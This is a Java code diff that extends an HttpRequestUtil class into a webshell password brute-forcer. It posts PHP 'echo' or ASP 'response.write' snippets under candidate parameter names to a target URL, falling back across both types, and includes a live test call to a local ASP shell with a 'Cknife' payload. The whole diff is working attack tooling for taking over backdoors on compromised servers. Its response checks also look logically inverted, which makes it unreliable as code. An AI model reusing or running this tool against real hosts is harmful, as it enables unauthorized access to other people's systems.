@@ -89,6 +89,7 @@ public class HttpRequestUtil {
             // 发送POST请求必须设置如下两行
             conn.setDoOutput(true);
             conn.setDoInput(true);
+            conn.setConnectTimeout(3000); // 设置超时时间
             // 获取URLConnection对象对应的输出流
             out = new PrintWriter(conn.getOutputStream());
             // 发送请求参数
@@ -104,7 +105,10 @@ public class HttpRequestUtil {
             }
         } catch (Exception e) {
             System.out.println("发送 POST 请求出现异常！"+e);
+            
             e.printStackTrace();
+            // 返回错误消息
+            return "ERROR "+e.toString();
         }
         //使用finally块来关闭输出流、输入流
         finally{
@@ -123,21 +127,84 @@ public class HttpRequestUtil {
         return result;
     }   
     
-    
-    
-    // 准备发送数据到服务器 组织参数
-    public static String realyPost(String url,List list){
+    /**
+     * 根绝类型整理参数格式
+     * @param list 参数列表
+     * @param type php 还是asp
+     * @return
+     */
+    public static String organizePassword(List list,String type){
     	StringBuffer sb = new StringBuffer();
-    	for (int i =0;i<list.size();i++){
-    		sb.append("&");
-    		sb.append(list.get(i)+"=echo 'password is "+list.get(i)+"'");
-    		sb.append(";");
+    	String str = new String();
+    	// 如果是ASP
+    	if(type.equals("ASP")){
+    		for (int i =0;i<list.size();i++){
+        		sb.append(list.get(i)+"=response.write(\"password is :"+list.get(i)+"\")");
+        		sb.append("&");
+        	}
     	}
-    	String str = sb.toString();
-    	String msg = HttpRequestUtil.sendPost(url,str);
-    	if ("password is ".indexOf(msg) < 0){
-    		return msg;
+    	// 如果是php
+    	if(type.equals("PHP")){
+    		for (int i =0;i<list.size();i++){
+        		sb.append("&");
+        		sb.append(list.get(i)+"=echo 'password is :"+list.get(i)+"'");
+        		sb.append(";");
+        	}
+        	
     	}
+    	str = sb.toString();
+    	
+    	return str;
+    }
+    
+    
+    /**
+     * 准备发送数据到服务器 组织参数
+     * @param url
+     * @param list
+     * @param type
+     * @return
+     */
+    public static String realyPost(String url,List list,String type){
+    	String str =  new String();
+    	String msg = new String();
+    	// 如果是asp 或者php
+    	if(type.equals("ASP") || type.equals("PHP")){
+    		str = HttpRequestUtil.organizePassword(list, type);
+        	msg = HttpRequestUtil.sendPost(url,str);
+        	if ("password is ".indexOf(msg) < 0){
+        		return msg;
+        	}
+        	// 如果返回错误
+        	if("ERROR ".indexOf(msg)>0){
+        		return msg;
+        	}
+    	}
+    	// 如果是其他
+    	if(type.equals("UnKnow")){
+    		
+        	
+        	str = HttpRequestUtil.organizePassword(list, "PHP");
+        	msg = HttpRequestUtil.sendPost(url,str);
+        	if ("password is ".indexOf(msg) < 0){
+        		return msg;
+        	}
+        	// 如果返回错误
+        	if("ERROR ".indexOf(msg)>0){
+        		return msg;
+        	}
+        	str = HttpRequestUtil.organizePassword(list, "ASP");
+        	msg = HttpRequestUtil.sendPost(url,str);
+        	if ("password is ".indexOf(msg) < 0){
+        		return msg;
+        	}
+        	// 如果返回错误
+        	if("ERROR ".indexOf(msg)>0){
+        		return msg;
+        	}
+    	}
+    	
+    	
     	return "";
     }
     
@@ -148,7 +215,7 @@ public class HttpRequestUtil {
 //    	System.out.println(s);
 //        System.out.println("==============");
 //        //发送 POST 请求
-//        String sr=HttpRequestUtil.sendPost("http://192.168.1.127/test2.php", "&v5est0r=echo 'password is v5est0r';&123=echo 'password is 123';&admin=echo 'password is admin';&1=echo 'password is 1';&pass=echo 'password is pass';&test=echo 'password is test';");
-//        System.out.println(sr);
+        String sr=HttpRequestUtil.sendPost("http://192.168.1.70:811/test/a.asp", "Cknife=response.write(\"password is :Cknife1\");");
+        System.out.println(sr);
     }
 }
